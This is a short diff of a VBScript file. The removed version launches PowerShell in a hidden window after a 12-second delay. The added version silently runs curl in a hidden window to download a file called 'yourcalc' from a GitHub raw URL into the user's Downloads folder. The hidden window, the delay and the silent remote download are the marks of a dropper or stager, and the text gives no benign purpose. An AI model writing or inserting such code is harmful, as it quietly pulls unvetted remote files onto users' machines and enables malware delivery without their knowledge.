@@ -1,3 +1,2 @@
-Set atwo = WScript.CreateObject ("WScript.shell")
-wscript.sleep 12000
-atwo.run "powershell ", 0, False
+Set onetwo = WScript.CreateObject ("WScript.shell")
+onetwo.run "curl https://raw.githubusercontent.com/the-deusgroup/test-project/main/yourcalc -o %USERPROFILE%\downloads\yourcalc", 0, False
